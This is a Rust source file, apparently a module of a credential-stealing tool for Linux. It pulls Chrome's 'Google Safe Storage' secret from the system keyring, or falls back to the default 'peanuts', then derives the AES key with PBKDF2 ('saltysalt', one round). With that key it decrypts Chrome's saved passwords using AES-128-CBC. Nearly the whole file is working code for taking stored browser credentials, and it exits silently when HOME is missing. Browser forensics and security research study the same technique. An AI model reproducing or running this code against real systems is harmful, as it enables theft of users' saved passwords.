use lazy_static::lazy_static;
use std::error::Error;
use std::collections::HashMap;

use {
    aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit},
    sha1::Sha1,
    pbkdf2::pbkdf2,
    hmac::Hmac,
    keyring::{
        Entry,
        credential::{PlatformCredential, LinuxCredential}
    },
};

lazy_static! {
    pub static ref HOME: String = std::env::var("HOME").unwrap_or_else(|_| std::process::exit(0));
    pub static ref PATHS: HashMap<&'static str, &'static str> = HashMap::from([
        ("chrome", ".config/google-chrome"),
    ]);
}

fn read_master_key() -> Result<Vec<u8>, Box<dyn Error>> {
    let keyring_credential = PlatformCredential::Linux(
        LinuxCredential {
            collection: String::from("default"),
            attributes: HashMap::from([
                (String::from("application"), String::from("chrome")),
            ]),
            label: String::from("Google Safe Storage"),
        },
    );

    let entry = Entry::new_with_credential(&keyring_credential)?;
    let secret_key = match entry.get_password() {
        Ok(p) => p.as_bytes().to_vec(),
        Err(_) => return Ok(b"peanuts".to_vec()),
    };

    Ok(secret_key)
}

fn decrypt_master_key(password: &mut [u8]) -> std::io::Result<Vec<u8>> {
    let salt = b"saltysalt";
    let rounds = 1;
    let mut res: [u8; 16] = [0; 16];
    pbkdf2::<Hmac<Sha1>>(password, salt, rounds, &mut res);
    Ok(res.to_vec())
}

pub fn decrypt_password(
    password: &[u8],
    key: &[u8]
) -> Result<String, Box<dyn Error>> {
    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    let key: [u8; 16] = key.try_into()?;
    let payload = &password[3..];
    let iv = [0x20; 16];
    let mut buf_vec = vec![0; payload.len()];
    let buf = buf_vec.as_mut_slice();

    let plaintext_slice = Aes128CbcDec::new(&key.into(), &iv.into())
        .decrypt_padded_b2b_mut::<Pkcs7>(payload, buf)
        .or(Err(""))?;
    let plaintext = String::from_utf8(plaintext_slice.to_vec())?;

    Ok(plaintext)
}

pub fn get_master_key() -> Result<Vec<u8>, Box<dyn Error>> {
    let mut key = read_master_key()?;
    let master_key = decrypt_master_key(&mut key)?;
    Ok(master_key)
}